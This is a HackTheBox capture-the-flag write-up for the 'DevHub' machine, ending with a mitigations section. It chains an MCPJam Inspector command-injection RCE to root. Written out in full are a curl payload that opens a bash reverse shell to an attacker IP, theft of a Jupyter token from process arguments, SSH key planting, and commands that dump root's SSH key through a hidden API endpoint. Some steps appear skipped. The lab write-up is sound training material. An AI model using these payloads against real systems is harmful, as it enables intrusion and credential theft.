# DevHub — HackTheBox Writeup

DevHub is an Ubuntu 22.04 machine hosting an internal development platform with multiple services. The attack chain starts with unauthenticated RCE through CVE-2026-23744 in MCPJam Inspector (port 6274), which gives a shell as `mcp-dev`. From there, a Jupyter Server token exposed in process arguments enables lateral movement to the `analyst` user. Finally, a Flask-based operations API running as root contains a hardcoded API key and a hidden credential-dump endpoint, which is used to extract the root SSH private key.

## Web Enumeration and Initial Access

### Port 80 — DevHub Portal

<img src="assets/img/devhub/web_home.png" alt="DevHub Home Page">

The main web interface is a static page documenting the platform's services. It reveals two key internal services: MCPJam Inspector on port 6274 and an Internal Analytics Panel (Jupyter) running on localhost:8888.

### MCPJam Inspector (Port 6274)

<img src="assets/img/devhub/mcp_jam.png" alt="MCPJam Inspector Interface">

MCPJam Inspector is a management interface for Model Context Protocol (MCP) servers — a framework that lets AI models interact with external tools and data sources. The interface allows discovering, configuring, and testing MCP server connections. The version shown is **1.4.2**, which is vulnerable to CVE-2026-23744.

<img src="assets/img/devhub/mcp_jam.png" alt="error loading image">

### CVE-2026-23744 — Remote Code Execution

MCPJam Inspector v1.4.2 and earlier have a critical RCE vulnerability in the `/api/mcp/connect` endpoint. This endpoint accepts unsanitized JSON payloads to define new MCP servers, and the `command` and `args` fields are passed directly to shell execution with no validation. This means an attacker can inject arbitrary OS commands through a crafted server configuration.

To exploit this, we send a POST request with a bash reverse shell embedded in the server config:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/DevHub]
└─$ curl -s "http://devhub.htb:6274/api/mcp/connect" -X POST -H "Content-Type: application/json" -d '{"serverId":"rev1","serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.15.176/9001 0>&1"]}}'
```

The `serverId` is an arbitrary identifier, and the `serverConfig` object tells the framework to execute `bash -c "bash -i >& /dev/tcp/10.10.15.176/9001 0>&1"`, which opens a reverse TCP connection back to the attacker.

### Extracting the Token

Inspecting the full command-line arguments of the Jupyter process leaks the authentication token. On Linux, process arguments are world-readable via `/proc/[pid]/cmdline`, so any local user can see them:

```shell
mcp-dev@devhub:~$ ps -up 1051 > a
```

The token `a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7` is sitting right there in the process arguments. Password authentication is disabled (`--ServerApp.password=`), making the token the only gate.

### Port Forwarding to Jupyter

```shell
┌──(kali㉿kali)-[~/HTB/Linux/DevHub]
└─$ ssh-keygen -t ed25519 -f ./id_ed25519 -N "" -C "mcp-dev@devhub" 
```

```shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ mkdir ~/.ssh
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII3m188FePbqz6ci6XbiUlMrZ6EH7iCoGsJ9+pFMFaQ4 mcp-dev@devhub" >> ~/.ssh/authorized_keys
```

Two critical flaws stand out. First, the API key `opsmcp_secret_key_4f5a6b7c8d9e0f1a` is hardcoded and readable by any local user who can access the source file. Second, the application maintains a set of "hidden" tools — `ops._admin_dump` and `ops._debug_mode` — that don't appear in the `/tools/list` output but are still fully callable through `/tools/call`. The `ops._admin_dump` tool reads `/root/.ssh/id_rsa` directly and returns it over the API, making it the path to root.

### Extracting the Root SSH Key

Using the hardcoded API key, we call the hidden `ops._admin_dump` endpoint with `target: ssh_keys` and `confirm: true`:

```shell
curl -X POST http://127.0.0.1:5000/tools/call -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -H "Content-Type: application/json" -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
```

We extract just the key from the JSON response and save it to a file:

```shell
curl -s -X POST http://127.0.0.1:5000/tools/call -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -H "Content-Type: application/json" -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}' | python3 -c "import sys, json; print(json.load(sys.stdin)['root_private_key'])" > id_rsa
```

## Mitigations

### 1. Upgrade MCPJam Inspector (CVE-2026-23744)

Upgrade MCPJam Inspector to a patched version. The `/api/mcp/connect` endpoint allowed user-supplied `command` and `args` fields to be executed without sanitization, enabling unauthenticated RCE.

```bash
npm update -g @mcpjam/inspector
```

### 2. Secure Jupyter Server Token Storage

Remove the authentication token from the command-line arguments and store it in a config file or environment variable instead. Process arguments are world-readable via `/proc/[pid]/cmdline` on Linux, which is how the `mcp-dev` user was able to steal the token and move laterally to `analyst`.

```python
# In jupyter_server_config.py
import os
c.ServerApp.token = os.environ.get('JUPYTER_TOKEN', '')
```

### 3. Remove Hardcoded Secrets and Dangerous API Endpoints

Move the API key out of the source code and into a proper secret management solution. More importantly, remove the `ops._admin_dump` endpoint entirely — an API that reads and returns `/root/.ssh/id_rsa` should never exist, regardless of authentication requirements.

```python
import os
VALID_API_KEY = os.environ.get('OPSMCP_API_KEY')
```
